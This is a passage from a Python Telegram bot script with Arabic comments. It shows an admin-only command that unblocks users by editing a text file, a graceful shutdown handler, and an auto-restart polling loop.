@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    try:
        if str(message.from_user.id) not in admins:
            bot.reply_to(message, "You do not have permission.")
            return
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
    except Exception as e:
        print(f"Error in unblock_user: {e}")
        bot.reply_to(message, "Usage: /unblock2 [user_id]")

# === معالج الإشارات للخروج الآمن ===
def signal_handler(sig, frame):
    print('Shutting down gracefully...')
    cleanup_memory()
    executor.shutdown(wait=False)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# === تشغيل البوت مع إعادة تشغيل تلقائية ===
print('✅ Bot is running...')
restart_count = 0
max_restarts = 10  # حد أقصى لإعادة التشغيل

while True:
    try:
        # تنظيف الذاكرة قبل كل تشغيل
        cleanup_memory()
        
        # تشغيل البوت
        bot.infinity_polling(none_stop=True, interval=1, timeout=30)
        
    except KeyboardInterrupt:
        print('Bot stopped by user')
        break
        
    except Exception as e:
        restart_count += 1
        print(f'❌ Error (Attempt {restart_count}/{max_restarts}): {e}')
        traceback.print_exc()
        
        # تنظيف الذاكرة
        cleanup_memory()
        gc.collect()
        
        # إذا تجاوزنا الحد الأقصى لإعادة التشغيل
        if restart_count >= max_restarts:
            print('Max restart attempts reached. Exiting...')
            break
        
        # انتظار قبل إعادة التشغيل
        time.sleep(5)
